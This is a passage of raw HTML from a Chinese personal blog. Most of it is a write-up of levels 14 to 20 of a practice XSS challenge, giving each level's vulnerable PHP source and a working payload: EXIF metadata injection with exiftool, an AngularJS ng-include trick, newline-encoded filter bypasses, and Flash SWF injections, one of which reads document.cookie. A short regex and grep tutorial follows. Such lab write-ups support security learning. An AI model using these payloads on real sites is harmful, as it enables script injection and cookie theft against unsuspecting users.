value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>存在<code>cookie</code><br>构造payload：<code> Cookie:&quot; onmouseover=alert(13) type=&quot;text&quot;</code></p>
<h2 id="TASK14"><a href="#TASK14" class="headerlink" title="TASK14"></a>TASK14</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level14&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>EXIF xss<br>上传图片，将exif元数更改为xsspayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exiftool -FIELD=XSS FILE</span><br><span class="line">exiftool -Artist=&#x27; &quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27; brute.jpeg</span><br></pre></td></tr></table></figure>
<h2 id="TASK15"><a href="#TASK15" class="headerlink" title="TASK15"></a>TASK15</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>angular js<br>ng-include为文件包含，可以包含含有xss的网页(可能需要vpn)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&#x27;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="TASK16"><a href="#TASK16" class="headerlink" title="TASK16"></a>TASK16</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;     &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>%0a，%0d绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Keyword=&lt;img%0dsrc=a%0donerror=alert(16)&gt;</span><br><span class="line">Keyword=&lt;iframe%0dsrc=0%0donmouseover=alert｀16｀&gt;&lt;/iframe&gt;</span><br><span class="line">Keyword=&lt;svg%0aonload=alert｀16｀&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<h2 id="TASK17"><a href="#TASK17" class="headerlink" title="TASK17"></a>TASK17</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>PAYLOAD:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=a&amp;arg02=b 8888 onmouseover=alert(1)</span><br></pre></td></tr></table></figure>
<h2 id="TASK18"><a href="#TASK18" class="headerlink" title="TASK18"></a>TASK18</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">和上一关相同</span><br></pre></td></tr></table></figure>
<h2 id="TASK19"><a href="#TASK19" class="headerlink" title="TASK19"></a>TASK19</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#x27;&lt;embed src=&quot;xsf03.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>先记录一下正解：FLASH XSS<br><code> ?arg01=version&amp;arg02=&lt;ahref=&quot;javascript:alert(document.domain)&quot;&gt;xss_by_didi&lt;/a&gt;</code></p>
<h2 id="TASK20"><a href="#TASK20" class="headerlink" title="TASK20"></a>TASK20</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level20&lt;/h1&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#x27;&lt;embed src=&quot;xsf04.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>zeroclipboard.swf<br>记录下正解：<br><code> level20.php?arg01=a&amp;arg02=\&quot;))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%26width%26height</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/29/basic-gerp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/29/basic-gerp/" class="post-title-link" itemprop="url">basic_gerp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-29 18:37:34 / 修改时间：19:39:38" itemprop="dateCreated datePublished" datetime="2021-11-29T18:37:34+08:00">2021-11-29</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="正则表达基础学习"><a href="#正则表达基础学习" class="headerlink" title="正则表达基础学习"></a>正则表达基础学习</h1><h2 id="正则表达式的规定"><a href="#正则表达式的规定" class="headerlink" title="正则表达式的规定"></a>正则表达式的规定</h2><ul>
<li>^ 匹配一行的开头 </li>
<li>$ 匹配一行的结尾 </li>
<li>() 标记子表达式的开始和结束位置 </li>
<li>[] 用于确定括号表达式中的开始和结束位置 </li>
<li>{} 用于标记前面子表达式的出现频度 </li>
<li>*指定前面子表达式可以出现零次和多次 </li>
<li>? 指定前面子表达式可以出现零次和一次</li>
<li>\d 匹配0~9的所有数字 </li>
<li>\D 匹配非数字 </li>
<li>\w 匹配所有的单词字符，包括0~9所有数字、26个英文字母和下划线（_） </li>
<li>\W 匹配所有非单词字符 </li>
<li>\ 用于转义下个字符 </li>
<li>| 表示两项之间选一项 </li>
<li>- 表示范围 </li>
</ul>
<p><em>实践</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">邮箱：^[a-zA-Z0-9_.-]+@[a-zA-Z0-9-]+(.[a-zA-Z0-9-]+)*.[a-zA-Z0-9]&#123;2,6&#125;$</span><br><span class="line">国内电话号码：\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;</span><br><span class="line">手机号码：^((13[0-9])|(14[5|7])|(15([0-3]|[5-9]))|(18[0,5-9]))\d&#123;8&#125;$</span><br></pre></td></tr></table></figure>
<h2 id="gerp命令"><a href="#gerp命令" class="headerlink" title="gerp命令"></a>gerp命令</h2><p>在文件中搜索一个单词，命令返回一个包含”pattern”的文本行：<br><code>grep pattern file_name1 file_name2</code><br><code>echo &quot;string&quot; | grep str</code><br><code>grep -E -F -G | -i -c -v</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">hanbaiGG</p>
  <div class="site-description" itemprop="description">为什么不拉弟弟一把呢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Tue Oct 19 2021 08:00:00 GMT+0800 (中国标准时间) – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hanbaiGG</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.8' zIndex='-1' count='300' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  















  

  


</body>
</html>
